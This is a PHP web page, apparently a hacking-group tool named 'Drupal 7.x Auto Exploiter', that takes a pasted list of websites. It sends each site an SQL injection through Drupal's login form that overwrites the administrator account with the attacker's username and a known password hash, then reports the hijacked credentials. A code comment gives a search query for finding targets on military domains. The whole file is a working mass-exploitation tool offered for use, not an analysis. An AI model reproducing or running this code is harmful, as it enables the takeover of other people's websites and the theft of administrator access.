<html><title>Drupal 7.x Auto Exploiter</title>
<body bgcolor="#000000">
<font color='red'><pre><p><center> 
==========================================================================================================

                      ===================================================================
    ___                     ___   ___ _____  
   / _ \ _ __   __ _ ___   / _ \ / _ \___  | 
  | (_) | '_ \ / _` / __| | | | | | | | / /  
   \__, | | | | (_| \__ \ | |_| | |_| |/ /   
     /_/|_| |_|\__,_|___/  \___/ \___//_/   
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh   
               uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
#Drupal Auto Exploiter
#Coded by AnonGhostDZ-Team
#Contact: fb ==> AnonGhostDZ-Team
______________________________________________________________

<pre>List Sites :</font><hre>
<form method='POST'>
<textarea name='sites' cols='45' rows='15'></textarea>
<input type='submit' value='Exploit' /><br>
</form>
<?php
/*
Coded by sofyan
inurl:sites/default/files/ site:mil.**
*/
error_reporting(0);
    $log = "/user/login";
    $url=explode("\r\n", $_POST['sites']);
    foreach ($url as $site) {
    $sofyan = "/?q=user";
    $post_data = "name[0;update users set name %3D 'sofyan' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($site . '/user/login/', null, $ctx);
     echo "<font color=blue>Testing user/login $site <br>";
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
        echo "<font color=green>User :sofyan <br>Password :admin<br>";
          } else {
        echo "<font color=red>Not Vulnerable. <br>";
    }
}
    $url=explode("\r\n", $_POST['sites']);
    foreach ($url as $site) {
    $post_data = "name[0;update users set name %3D 'sofyan' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($site . '?q=node&destination=node', null, $ctx);
     echo "<font color=blue>Testing at Index $site <br>";
    if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
        echo "<font color=green>User :sofyan <br> Password :admin <br>";
       
    } else {
        echo "<font color=red>Not Vulnerable. \n ";
    }
}
?>
</pre></p></center>
